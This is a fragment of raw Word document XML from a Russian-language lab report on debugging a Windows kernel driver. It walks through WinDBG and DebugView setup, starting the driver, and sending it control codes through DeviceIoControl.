        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00524FB3">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>to</w:t>
      </w:r>
      <w:r w:rsidR="00524FB3" w:rsidRPr="00524FB3">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00524FB3">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>k</w:t>
      </w:r>
      <w:r w:rsidR="00DF2217">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>ernel</w:t>
      </w:r>
      <w:r w:rsidR="00DF2217" w:rsidRPr="00DF2217">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="538EE62C" w14:textId="77777777" w:rsidR="00DF2217" w:rsidRPr="00B40B39" w:rsidRDefault="00DF2217" w:rsidP="00146996"/>
    <w:p w14:paraId="12477B98" w14:textId="02202A76" w:rsidR="00DF2217" w:rsidRDefault="00524FB3" w:rsidP="00DF2217">
      <w:pPr>
        <w:pStyle w:val="af8"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="27099C54" wp14:editId="1717EAC6">
            <wp:extent cx="6300470" cy="3558540"/>
            <wp:effectExtent l="0" t="0" r="5080" b="3810"/>
            <wp:docPr id="175793847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38475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A56F" w14:textId="6A7F0742" w:rsidR="00DF2217" w:rsidRPr="00DF2217" w:rsidRDefault="00DF2217" w:rsidP="00DF221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10</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidRPr="00DF2217">
        <w:t xml:space="preserve"> – </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">Настройка </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>WinDBG</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="7063542C" w14:textId="77777777" w:rsidR="00DF2217" w:rsidRPr="00DF2217" w:rsidRDefault="00DF2217" w:rsidP="00DF2217"/>
    <w:p w14:paraId="027750D6" w14:textId="77777777" w:rsidR="00B40B39" w:rsidRPr="00524FB3" w:rsidRDefault="00DF2217" w:rsidP="00DF2217">
      <w:r>
        <w:t>Затем отладчик будет ожидать включения виртуальной машины.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52A2B60E" w14:textId="77777777" w:rsidR="00B40B39" w:rsidRPr="00524FB3" w:rsidRDefault="00B40B39" w:rsidP="00DF2217"/>
    <w:p w14:paraId="59482829" w14:textId="77777777" w:rsidR="00B40B39" w:rsidRDefault="00B40B39" w:rsidP="00B40B39">
      <w:pPr>
        <w:pStyle w:val="af8"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7BF95807" wp14:editId="1E026BE5">
            <wp:extent cx="6300470" cy="4948555"/>
            <wp:effectExtent l="0" t="0" r="5080" b="4445"/>
            <wp:docPr id="137248499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99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EB3" w14:textId="01B5D933" w:rsidR="00B40B39" w:rsidRPr="00911A8F" w:rsidRDefault="00B40B39" w:rsidP="00B40B3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11</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidRPr="00911A8F">
        <w:t xml:space="preserve"> – </w:t>
      </w:r>
      <w:r>
        <w:t>Ожидание включения виртуальной машины</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75C86D53" w14:textId="77777777" w:rsidR="00B40B39" w:rsidRPr="00911A8F" w:rsidRDefault="00B40B39" w:rsidP="00DF2217"/>
    <w:p w14:paraId="18393565" w14:textId="2749BA77" w:rsidR="00DF2217" w:rsidRPr="00E24E33" w:rsidRDefault="00DF2217" w:rsidP="00DF2217">
      <w:r>
        <w:t xml:space="preserve"> После полной загрузки виртуальной машины можно проверить, что отладчик подключился к виртуальной машине, нажав на паузу. ОС заморозится и ничего не будет происходить. На панели отладчика можно видеть выполняемые инструкции, выводимые сообщения, командную строку и память. Для продолжения работы ОС необходимо </w:t>
      </w:r>
      <w:r w:rsidR="00E24E33">
        <w:t>отправить  в командную строку отладчика</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00E24E33">
        <w:t>“</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>g</w:t>
      </w:r>
      <w:r w:rsidRPr="00E24E33">
        <w:t>”</w:t>
      </w:r>
      <w:r w:rsidR="00B40B39">
        <w:t xml:space="preserve"> или нажать </w:t>
      </w:r>
      <w:r w:rsidR="00B40B39">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Go</w:t>
      </w:r>
      <w:r w:rsidRPr="00E24E33">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18FC4217" w14:textId="77777777" w:rsidR="00DF2217" w:rsidRDefault="00DF2217" w:rsidP="00DF2217"/>
    <w:p w14:paraId="50A6CE31" w14:textId="79F80E99" w:rsidR="00DF2217" w:rsidRDefault="00B40B39" w:rsidP="00DF2217">
      <w:pPr>
        <w:pStyle w:val="af8"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3C54F972" wp14:editId="0B7369CC">
            <wp:extent cx="6300470" cy="4940300"/>
            <wp:effectExtent l="0" t="0" r="5080" b="0"/>
            <wp:docPr id="12907415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415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2DAF" w14:textId="1197354F" w:rsidR="00DF2217" w:rsidRPr="00524FB3" w:rsidRDefault="00DF2217" w:rsidP="00DF221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12</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> – Интерфейс отладчика</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17D451AE" w14:textId="77777777" w:rsidR="00E37F01" w:rsidRDefault="00E37F01" w:rsidP="00E37F01"/>
    <w:p w14:paraId="40E58967" w14:textId="5633B623" w:rsidR="00033F36" w:rsidRPr="00524FB3" w:rsidRDefault="00033F36" w:rsidP="00033F36">
      <w:pPr>
        <w:pStyle w:val="a6"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="851"/>
      </w:pPr>
      <w:r w:rsidRPr="00033F36">
        <w:t>4</w:t>
      </w:r>
      <w:r>
        <w:t>.3 Запуск драйвера и взаимодействие с ним</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77933BCE" w14:textId="77777777" w:rsidR="00E37F01" w:rsidRDefault="00E37F01" w:rsidP="00E37F01">
      <w:r>
        <w:t xml:space="preserve">Далее необходимо запустить драйвер. Для этого необходимо нажать </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Install</w:t>
      </w:r>
      <w:r w:rsidRPr="00E37F01">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">для установочного файла </w:t>
      </w:r>
      <w:r w:rsidRPr="00E37F01">
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>inf</w:t>
      </w:r>
      <w:r w:rsidRPr="00E37F01">
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B5E7635" w14:textId="756D332C" w:rsidR="00E37F01" w:rsidRDefault="00E24E33" w:rsidP="00E37F01">
      <w:r>
        <w:t>Также</w:t>
      </w:r>
      <w:r w:rsidR="00E37F01">
        <w:t xml:space="preserve"> необходимо получать отладочные сообщения драйвера. В этом может помочь утилита </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00E37F01">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>DebugView</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00E37F01">
        <w:t>, которую необходимо скачать</w:t>
      </w:r>
      <w:r w:rsidR="000045C6">
        <w:t xml:space="preserve"> и задать некоторые настройки</w:t>
      </w:r>
      <w:r w:rsidR="00E37F01" w:rsidRPr="00E37F01">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A11481F" w14:textId="40D5C1AB" w:rsidR="00E37F01" w:rsidRDefault="00E37F01" w:rsidP="00E37F01">
      <w:r>
        <w:t>Затем необходимо запустить командную строку от имени администратора и запустить драйвер</w:t>
      </w:r>
      <w:r w:rsidR="0015339D">
        <w:t xml:space="preserve"> командой </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="668F94B9" w14:textId="7D72E670" w:rsidR="0015339D" w:rsidRDefault="0015339D" w:rsidP="0015339D">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">net start </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>MBKS_driver</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> .</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1818D4A4" w14:textId="77777777" w:rsidR="007F15A9" w:rsidRDefault="007F15A9" w:rsidP="007F15A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="01F98A14" w14:textId="77777777" w:rsidR="007F15A9" w:rsidRDefault="007F15A9" w:rsidP="007F15A9">
      <w:pPr>
        <w:pStyle w:val="af8"/>
      </w:pPr>
      <w:r w:rsidRPr="007F15A9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7D0B8159" wp14:editId="4A1309A7">
            <wp:extent cx="2946400" cy="1566779"/>
            <wp:effectExtent l="0" t="0" r="6350" b="0"/>
            <wp:docPr id="1353728713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8713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067" cy="157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7AA0" w14:textId="5581D2DA" w:rsidR="007F15A9" w:rsidRPr="007F15A9" w:rsidRDefault="007F15A9" w:rsidP="007F15A9">
      <w:pPr>
        <w:pStyle w:val="ad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13</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> – </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">Настройка </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>DebugView</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="1EB7DC7C" w14:textId="77777777" w:rsidR="00E37F01" w:rsidRDefault="00E37F01" w:rsidP="00E37F01"/>
    <w:p w14:paraId="7E9D50A0" w14:textId="77777777" w:rsidR="0015339D" w:rsidRPr="00E37F01" w:rsidRDefault="0015339D" w:rsidP="00E37F01"/>
    <w:p w14:paraId="584616AD" w14:textId="77777777" w:rsidR="00E37F01" w:rsidRDefault="00E37F01" w:rsidP="00E37F01">
      <w:pPr>
        <w:pStyle w:val="af8"/>
      </w:pPr>
      <w:r w:rsidRPr="00E37F01">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="642AB706" wp14:editId="508CC4B1">
            <wp:extent cx="4656746" cy="3092450"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="27865383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5383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020" cy="31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2065" w14:textId="2491FC29" w:rsidR="00E37F01" w:rsidRDefault="00E37F01" w:rsidP="00E37F01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14</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> – </w:t>
      </w:r>
      <w:r>
        <w:t>Установка драйвера</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="004B5AF2" w14:textId="77777777" w:rsidR="0015339D" w:rsidRDefault="0015339D" w:rsidP="0015339D"/>
    <w:p w14:paraId="6AFF0DF2" w14:textId="77777777" w:rsidR="0015339D" w:rsidRDefault="0015339D" w:rsidP="0015339D">
      <w:pPr>
        <w:pStyle w:val="af8"/>
      </w:pPr>
      <w:r w:rsidRPr="0015339D">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="61A28109" wp14:editId="6E1D2ADA">
            <wp:extent cx="6300470" cy="3091180"/>
            <wp:effectExtent l="0" t="0" r="5080" b="0"/>
            <wp:docPr id="50439269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9269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E010" w14:textId="42198512" w:rsidR="0015339D" w:rsidRPr="0015339D" w:rsidRDefault="0015339D" w:rsidP="0015339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15</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> – Просмотр отладочных сообщений</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19579973" w14:textId="5CACCA45" w:rsidR="00D65044" w:rsidRPr="001B6552" w:rsidRDefault="001172D4" w:rsidP="001172D4">
      <w:pPr>
        <w:pStyle w:val="af8"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B485682" w14:textId="330E4D48" w:rsidR="0015339D" w:rsidRDefault="0015339D" w:rsidP="0015339D">
      <w:r>
        <w:t>После этого была написана программа</w:t>
      </w:r>
      <w:r w:rsidR="001B6552">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="001B6552">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>SendToDriver</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">, позволяющая отправлять драйверу данные. Для этого необходима функция </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0015339D">
        <w:t>DeviceIoControl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>(), которая о</w:t>
      </w:r>
      <w:r w:rsidRPr="0015339D">
        <w:t>тправляет код управления непосредственно указанному драйверу устройства, заставляя соответствующее устройство выполнить соответствующую операцию.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C1531BB" w14:textId="77777777" w:rsidR="008373C8" w:rsidRPr="008373C8" w:rsidRDefault="008373C8" w:rsidP="008373C8">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008373C8">
        <w:t xml:space="preserve">BOOL </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008373C8">
        <w:t>DeviceIoControl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008373C8">
        <w:t>(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14219506" w14:textId="77777777" w:rsidR="008373C8" w:rsidRPr="008373C8" w:rsidRDefault="008373C8" w:rsidP="008373C8">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008373C8">
        <w:t xml:space="preserve">  [in]                HANDLE       </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008373C8">
        <w:t>hDevice</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008373C8">
        <w:t>,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="675EC299" w14:textId="77777777" w:rsidR="008373C8" w:rsidRPr="008373C8" w:rsidRDefault="008373C8" w:rsidP="008373C8">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008373C8">
        <w:t xml:space="preserve">  [in]                DWORD        </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008373C8">
        <w:t>dwIoControlCode</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008373C8">
        <w:t>,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="395C42FF" w14:textId="77777777" w:rsidR="008373C8" w:rsidRPr="008373C8" w:rsidRDefault="008373C8" w:rsidP="008373C8">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008373C8">
        <w:t xml:space="preserve">  [in, optional]      LPVOID       </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008373C8">
        <w:t>lpInBuffer</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008373C8">
        <w:t>,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2382FB31" w14:textId="77777777" w:rsidR="008373C8" w:rsidRPr="008373C8" w:rsidRDefault="008373C8" w:rsidP="008373C8">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008373C8">
        <w:t xml:space="preserve">  [in]                DWORD        </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008373C8">
        <w:t>nInBufferSize</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008373C8">
        <w:t>,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72EB565F" w14:textId="77777777" w:rsidR="008373C8" w:rsidRPr="008373C8" w:rsidRDefault="008373C8" w:rsidP="008373C8">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008373C8">
        <w:t xml:space="preserve">  [out, optional]     LPVOID       </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008373C8">
        <w:t>lpOutBuffer</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008373C8">
        <w:t>,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="495D76F8" w14:textId="77777777" w:rsidR="008373C8" w:rsidRPr="008373C8" w:rsidRDefault="008373C8" w:rsidP="008373C8">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008373C8">
        <w:t xml:space="preserve">  [in]                DWORD        </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008373C8">
        <w:t>nOutBufferSize</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008373C8">
        <w:t>,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21A9D6B2" w14:textId="77777777" w:rsidR="008373C8" w:rsidRPr="008373C8" w:rsidRDefault="008373C8" w:rsidP="008373C8">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008373C8">
        <w:t xml:space="preserve">  [out, optional]     LPDWORD      </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008373C8">
        <w:t>lpBytesReturned</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008373C8">
        <w:t>,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B9E32E6" w14:textId="77777777" w:rsidR="008373C8" w:rsidRPr="008373C8" w:rsidRDefault="008373C8" w:rsidP="008373C8">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008373C8">
        <w:t xml:space="preserve">  [in, out, optional] LPOVERLAPPED </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008373C8">
        <w:t>lpOverlapped</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="4002CBD4" w14:textId="4F1358ED" w:rsidR="008373C8" w:rsidRPr="00524FB3" w:rsidRDefault="008373C8" w:rsidP="008373C8">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008373C8">
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="174F721F" w14:textId="06F41B3F" w:rsidR="008373C8" w:rsidRDefault="008373C8" w:rsidP="0095388A">
      <w:pPr>
        <w:pStyle w:val="af6"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008373C8">
        <w:t>hDevice</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> – д</w:t>
      </w:r>
      <w:r w:rsidRPr="008373C8">
        <w:t xml:space="preserve">ескриптор устройства, на котором должна выполняться операция. Устройство обычно представляет собой том, каталог, файл или поток. Чтобы получить дескриптор устройства, </w:t>
      </w:r>
      <w:r>
        <w:t>необходимо использовать</w:t>
      </w:r>
      <w:r w:rsidRPr="008373C8">
        <w:t xml:space="preserve"> функцию </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008373C8">
        <w:t>CreateFile</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008373C8">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A0B71C3" w14:textId="6E76C900" w:rsidR="00E24E33" w:rsidRDefault="00E24E33" w:rsidP="0095388A">
      <w:pPr>
        <w:pStyle w:val="af6"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E24E33">
        <w:lastRenderedPageBreak/>
        <w:t>dwIoControlCode</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> – к</w:t>
      </w:r>
      <w:r w:rsidRPr="00E24E33">
        <w:t>од управления для операции. Это значение определяет конкретную операцию, которую необходимо выполнить, и тип устройства, на котором она будет выполняться.</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Как было выяснено ранее для рассматриваемого драйвера код </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>управления может быть</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> только 2237443 (0</w:t>
      </w:r>
      <w:r w:rsidRPr="0095388A">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>x</w:t>
      </w:r>
      <w:r>
        <w:t>222403).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F6B452D" w14:textId="51CA1606" w:rsidR="00E24E33" w:rsidRDefault="00E24E33" w:rsidP="0095388A">
      <w:pPr>
        <w:pStyle w:val="af6"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E24E33">
        <w:t>lpInBuffer</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> – указатель на входной буфер, содержащий данные, необходимые для выполнения операции. Формат этих данных зависит от значения параметра </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>dwIoControlCode</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">. Этот параметр может быть нулевым, если </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>dwIoControlCode</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> задает операцию, для которой не требуются входные данные.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4173064A" w14:textId="6A135786" w:rsidR="00E24E33" w:rsidRDefault="0095388A" w:rsidP="0095388A">
      <w:pPr>
        <w:pStyle w:val="af6"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0095388A">
        <w:t>nInBufferSize</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> – р</w:t>
      </w:r>
      <w:r w:rsidRPr="0095388A">
        <w:t>азмер входного буфера в байтах.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54AFCFA6" w14:textId="28684F43" w:rsidR="0095388A" w:rsidRDefault="0095388A" w:rsidP="0095388A">
      <w:pPr>
        <w:pStyle w:val="af6"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0095388A">
        <w:t>lpOutBuffer</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> – Указатель на выходной буфер, который должен принимать данные, возвращаемые операцией. Формат этих данных зависит от значения параметра </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>dwIoControlCode</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">. Этот параметр может быть нулевым, если </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>dwIoControlCode</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> указывает операцию, которая не возвращает данные.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02CC5009" w14:textId="6AAF1877" w:rsidR="0095388A" w:rsidRDefault="0095388A" w:rsidP="0095388A">
      <w:pPr>
        <w:pStyle w:val="af6"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0095388A">
        <w:t>nOutBufferSize</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> – р</w:t>
      </w:r>
      <w:r w:rsidRPr="0095388A">
        <w:t>азмер выходного буфера в байтах.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="758036C4" w14:textId="6ECB0D20" w:rsidR="0095388A" w:rsidRDefault="0095388A" w:rsidP="0095388A">
      <w:pPr>
        <w:pStyle w:val="af6"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0095388A">
        <w:t>lpBytesReturned</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> – у</w:t>
      </w:r>
      <w:r w:rsidRPr="0095388A">
        <w:t>казатель на переменную, которая принимает размер данных, хранящихся в выходном буфере, в байтах.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D13930A" w14:textId="75F4B60E" w:rsidR="0095388A" w:rsidRPr="008D6379" w:rsidRDefault="0095388A" w:rsidP="0095388A">
      <w:pPr>
        <w:pStyle w:val="af6"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0095388A">
        <w:t>lpOverlapped</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> – у</w:t>
      </w:r>
      <w:r w:rsidRPr="0095388A">
        <w:t xml:space="preserve">казатель на </w:t>
      </w:r>
      <w:r>
        <w:t>перекрывающуюся</w:t>
      </w:r>
      <w:r w:rsidRPr="0095388A">
        <w:t xml:space="preserve"> структуру.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1883C16A" w14:textId="77777777" w:rsidR="008D6379" w:rsidRPr="00524FB3" w:rsidRDefault="008D6379" w:rsidP="008D6379"/>
    <w:p w14:paraId="33D29B28" w14:textId="7691606B" w:rsidR="008D6379" w:rsidRPr="008D6379" w:rsidRDefault="008D6379" w:rsidP="008D6379">
      <w:r>
        <w:t xml:space="preserve">Также перед и после вызова функции </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>DeviceIoControl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> были добавлены ассемблерные инструкции </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>int</w:t>
      </w:r>
      <w:r w:rsidRPr="008D6379">
